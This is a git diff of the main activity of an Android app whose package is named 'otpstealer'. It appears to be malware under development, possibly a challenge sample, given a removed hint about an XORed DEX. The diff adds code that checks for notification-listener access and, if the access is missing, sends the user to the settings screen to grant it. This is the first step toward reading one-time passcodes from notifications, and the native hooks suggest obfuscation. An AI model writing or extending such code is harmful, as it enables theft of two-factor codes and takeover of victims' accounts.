@@ -1,7 +1,10 @@
 package com.example.otpstealer
 
+import android.content.Context
+import android.content.Intent
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.util.Log
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -16,7 +19,6 @@ import androidx.compose.runtime.Composable
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.tooling.preview.Preview
 import androidx.compose.ui.unit.dp
-import com.app.artful.ArtfulLibraryHelper
 import com.example.otpstealer.ui.theme.OtpStealerTheme
 
 
@@ -25,12 +27,9 @@ class MainActivity : ComponentActivity() {
     companion object {
         init {
             System.loadLibrary("native-lib")
-//            System.loadLibrary("artful")
-//            ArtfulLibraryHelper.registerNativeMethodsForClass(MainActivity::class.java)
         }
     }
 
-    external fun stringFromJNI(): String
     external fun getTime(): String
     // TODO: get rid of this
     external fun replaceLogEByObject(targetObject: Any?)
@@ -48,19 +47,27 @@ class MainActivity : ComponentActivity() {
         return "test"
     }
 
+    private fun isNotificationServiceEnabled(): Boolean {
+        val enabledListeners = Settings.Secure.getString(
+            this.contentResolver,
+            "enabled_notification_listeners"
+        )
+        val packageName = this.packageName
+        return enabledListeners?.contains(packageName) == true
+    }
+
     @RequiresApi(Build.VERSION_CODES.O)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
+        if (!isNotificationServiceEnabled()) {
+            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
+            startActivity(intent)
+        }
+
         Thread {
-            val result = stringFromJNI()
             val time = getTime()
-            test()
-            test()
-            test()
-            Log.e("this_will", "not_work_as_expected_look_for_XORED_DEX")
             Log.d("NativeCode", time)
-            Log.d("NativeCode", result)
         }.start()
 
         setContent {
